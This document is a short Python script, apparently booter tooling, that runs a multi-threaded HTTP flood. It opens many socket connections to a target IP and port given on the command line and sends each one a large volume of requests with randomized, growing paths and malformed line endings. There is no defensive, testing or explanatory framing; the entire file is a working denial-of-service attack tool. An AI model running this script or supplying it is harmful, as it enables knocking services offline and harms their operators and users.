import socket,random,threading,sys,string

def generate_weird(length):
    raw = '/'
    for _ in range(length):
     raw += raw.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(1,40))])
    return raw.encode()

def random_end():
   random_char = [random.choice(('\n','\r')) for _ in range(4)]
   return "".join(random_char)

def HTTP_LETTER(ip,port,time,booters,methods):
    path_size = 1
    for _ in range(time):
        try:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((ip, port));s.connect_ex((ip ,port))
         s2 = socket.create_connection((ip,port))
         
         path = generate_weird(path_size)
         end = random_end()
         packet = [f'{methods} /{path.decode()} HTTP/1.1\nHost: {ip}{end}',f'{methods} /{path.decode()} HTTP/1.1\nHost: {ip}:{port}{end}',f'{methods} /{path} HTTP/1.1\nHost: {ip}{end}',f'{methods} /{path} HTTP/1.1\nHost: {ip}:{port}{end}']
         for p in packet:
            for _ in range(booters):
               s.sendall(p.encode())
               s.send(p.encode())
               s2.sendall(p.encode())
               s2.send(p.encode())
        except:pass
        path_size += 1

ip,methods = sys.argv[1],sys.argv[6]
port,time,booters,th = int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4]),int(sys.argv[5])
# IP PORT TIME BOOTER THREAD METHODS
for _ in range(th):
   threading.Thread(target=HTTP_LETTER,args=(ip,port,time,booters,methods)).start()